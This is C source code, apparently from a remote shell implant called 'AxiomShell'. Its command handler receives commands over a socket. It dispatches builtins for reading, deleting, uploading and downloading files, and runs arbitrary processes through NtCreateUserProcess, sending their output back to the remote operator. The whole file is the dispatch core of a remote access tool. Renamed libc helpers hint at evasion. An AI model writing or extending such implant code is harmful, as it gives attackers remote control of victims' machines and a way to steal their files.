#include <stdio.h>
#include "AxiomShell.h"
#include "Glibc.h"

void CORE_handle_command(SOCKET sock, PCOMMAND cmd)
{
	size_t i;
	char *cmdargs;
	char *tmpcmdargs;
	char *output;
	DISPATCHER builtinDispatcher[] = {
		{ "cd", BUILTIN_cd },
		{ "whoami", BUILTIN_whoami },
		{ "cat", BUILTIN_cat },
		{ "rm", BUILTIN_rm },
		{ "rmdir", BUILTIN_rmdir },
		{ "mkdir", BUILTIN_mkdir },
		{ "ls", BUILTIN_ls },
		{ "download", BUILTIN_download },
		{ "upload", BUILTIN_upload },
		{ NULL, NULL }
	};

	// Process the command
	printf("[+] Running dispatcher\n");
	switch (cmd->commandType)
	{
		case CommandBuiltin:
		
			i = 0;
			while (builtinDispatcher[i].builtin_name != NULL)
			{
				if (drunk_strcmp(cmd->binary, builtinDispatcher[i].builtin_name) == 0)
				{
				    builtinDispatcher[i].builtin_pointer(sock, cmd->argumentCount, cmd->arguments);
				    break;
				}
				i++;
			}
			if (builtinDispatcher[i].builtin_name == NULL) {
				JSON_send_packets(JsonCommandOutput, sock, (void *)"[!] Unknown builtin name\n");
				printf("[!] Unknown builtin name: %s\n", cmd->binary);
			}
			break;
		case CommandCommand:
			i = 0;
			cmdargs = (char *)drunk_strdup("");

			// Build CLI arguments as a single string (the format expected by NtCreateUserProcess)
			while (i < cmd->argumentCount)
			{
				tmpcmdargs = malloc(strlen(cmdargs) + strlen(cmd->arguments[i]) + strlen(" ") + 1);
				drunk_strcpy(tmpcmdargs, cmdargs);
				drunk_strcat(tmpcmdargs, " ");
				drunk_strcat(tmpcmdargs, cmd->arguments[i]);
				free(cmdargs);
				cmdargs = tmpcmdargs;
				i++;
			}

			// Invoke process
			i = CORE_process_invoke(cmd->binary, cmdargs, (const char **)&output);

			// Send raw binary JSON packet
			JSON_RAW_BINARY_ARGS args;
			args.buffer = output;
			args.bufferlen = i;
			JSON_send_packets(JsonRawBinary, sock, &args);

			// Free output
			free(cmdargs);
			free(output);
			break;
		default:
			JSON_send_packets(JsonCommandOutput, sock, (void*)"[!] Unknown command type\n");
			break;
	}
}

